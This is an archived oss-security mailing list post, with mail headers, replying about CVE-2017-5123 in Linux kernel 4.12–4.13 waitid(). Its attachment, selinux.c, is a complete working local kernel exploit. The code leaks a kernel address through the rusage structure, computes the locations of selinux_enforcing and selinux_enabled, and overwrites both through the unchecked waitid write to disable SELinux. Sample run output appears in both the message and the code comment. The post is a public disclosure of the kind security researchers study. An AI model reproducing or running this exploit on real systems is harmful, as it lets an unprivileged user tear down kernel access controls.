X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3975" "Wednesday" "25" "October" "2017" "12:42:41" "+0200" "up201407890@alunos.dcc.fc.up.pt" "up201407890@alunos.dcc.fc.up.pt" "<20171025124241.12925hypflmm08sg@webmail.alunos.dcc.fc.up.pt>" "155" "[oss-security] Re: CVE-2017-5123 Linux kernel v4.13 waitid() not calling access_ok()" nil nil nil "10" "2017102510:42:41" "[oss-security] Re: CVE-2017-5123 Linux kernel v4.13 waitid() not calling access_ok()" (number mark "U       up201407890@ Oct 25  155/3975  " thread-indent "\"[oss-security] Re: CVE-2017-5123 Linux kernel v4.13 waitid() not calling access_ok()\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 22366 invoked by uid 550); 25 Oct 2017 10:50:33 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 18313 invoked from network); 25 Oct 2017 10:43:32 -0000
Message-ID: <20171025124241.12925hypflmm08sg@webmail.alunos.dcc.fc.up.pt>
Date: Wed, 25 Oct 2017 12:42:41 +0200
From: up201407890@alunos.dcc.fc.up.pt
To: oss-security@lists.openwall.com
MIME-Version: 1.0
Content-Type: multipart/mixed;
	boundary="=_5gufam68hvok"
Content-Transfer-Encoding: 7bit
User-Agent: Internet Messaging Program (IMP) H3 (4.2)
X-Virus-Scanned: amavisd-new at alunos.dcc.fc.up.pt
Subject: [oss-security] Re: CVE-2017-5123 Linux kernel v4.13 waitid() not calling
	access_ok()

--=_5gufam68hvok
Content-Type: text/plain;
	charset=ISO-8859-1;
	DelSp="Yes";
	format="flowed"
Content-Disposition: inline
Content-Transfer-Encoding: 7bit

Hello,

I've written a quick exploit for that vulnerability.
Instead of using it for malicious purposes, I use it to actually  
increase my systems security.

$ id
uid=1000
$ ./a.out
[+] Leak size=144 bytes
[+] Got kernel base: 0xffffffffb5200000
[+] Got selinux_enforcing: 0xffffffffb611cc90
[+] Got selinux_enabled: 0xffffffffb5eb1350
[+] Overwriting selinux_enforcing...
[+] Overwriting selinux_enabled...
[+] SELinux disabled!

Enjoy,
Federico Bento.

PS: It's just a joke :)


----------------------------------------------------------------
This message was sent using IMP, the Internet Messaging Program.


--=_5gufam68hvok
Content-Type: text/x-csrc;
	charset=UTF-8;
	name="selinux.c"
Content-Disposition: attachment;
	filename="selinux.c"
Content-Transfer-Encoding: quoted-printable

/*
 * 4.12-4.13 waitid() infoleak and write-not-what-only-where - Yes, I just =
coined that term
 *=20
 * Federico Bento
 * @uid1000 on twitter
 *
 *=20
 * This quick, dirty and ugly exploit will actually give the system increas=
ed security
 * That's why it's beautiful :)
 *
 *
 * $ id
 * uid=3D1000
 * $ ./a.out
 * [+] Leak size=3D144 bytes
 * [+] Got kernel base: 0xffffffffb5200000
 * [+] Got selinux_enforcing: 0xffffffffb611cc90
 * [+] Got selinux_enabled: 0xffffffffb5eb1350
 * [+] Overwriting selinux_enforcing...
 * [+] Overwriting selinux_enabled...
 * [+] SELinux disabled!
 *
 *
 * Thanks to Andr=C3=A9 Baptista (@0xACB) and all xSTF, spender for the inf=
oleak
 *=20
 * Shout-out to all .pt :)
 *
 * Still relevant: https://www.grsecurity.net/~spender/pics/mac_security_se=
samestreet.jpg
 *
 */

#include <stdio.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/resource.h>
#include <syscall.h>

/* offsets might differ, kernel was custom compiled */
#define OFFSET_TO_BASE 0x1aec98
#define SELINUX_ENFORCING 0xf1cc90
#define SELINUX_ENABLED 0xcb1350

int main(void)
{
	int pid, pid2, pid3;
	struct rusage rusage =3D { };
	unsigned long *p;
	char *selinux_enforcing, *selinux_enabled;
	pid =3D fork();
	if (pid > 0) {
		syscall(__NR_waitid, P_PID, pid, NULL, WEXITED|WNOHANG|__WNOTHREAD, &rusa=
ge);
		printf("[+] Leak size=3D%d bytes\n", sizeof(rusage));
		for (p =3D (unsigned long *)&rusage;
		     p < (unsigned long *)((char *)&rusage + sizeof(rusage));
		     p++) {
			if (*p > 0xffffffff00000000 && *p < 0xffffffffff000000) {
				p =3D (unsigned long *)(*p - OFFSET_TO_BASE); // spender's wouldn't act=
ually work when KASLR was enabled
				printf("[+] Got kernel base: %p\n", p);
				selinux_enforcing =3D (char *)p + SELINUX_ENFORCING;
				printf("[+] Got selinux_enforcing: %p\n", selinux_enforcing);
				selinux_enabled =3D (char *)p + SELINUX_ENABLED;
				printf("[+] Got selinux_enabled: %p\n", selinux_enabled);
				break;
			}
		}
		if(p < (unsigned long *)0xffffffff00000000 || p > (unsigned long *)0xffff=
ffffff000000)
			exit(-1);
	} else if (pid =3D=3D 0) {
		sleep(1);
		exit(0);
	}
	pid2 =3D fork();
	if (pid2 > 0) {
		printf("[+] Overwriting selinux_enforcing...\n");
		if (syscall(__NR_waitid, P_PID, pid, (siginfo_t *)(selinux_enforcing - 2)=
, WEXITED|WNOHANG|__WNOTHREAD, NULL) < 0) {
			printf("[-] Failed!\n");
			exit(1);
		}
	} else if (pid2 =3D=3D 0) {
		sleep(1);
		exit(0);
	}

	pid3 =3D fork();
        if (pid3 > 0) {
                printf("[+] Overwriting selinux_enabled...\n");
                if (syscall(__NR_waitid, P_PID, pid, (siginfo_t *)(selinux_=
enabled - 2), WEXITED|WNOHANG|__WNOTHREAD, NULL) < 0) {
                        printf("[-] Failed!\n");
                        exit(1);
                }
                printf("[+] SELinux disabled!\n");
                exit(0);
        } else if (pid3 =3D=3D 0) {
                sleep(1);
                exit(0);
        }
	return 0;
}=

--=_5gufam68hvok--

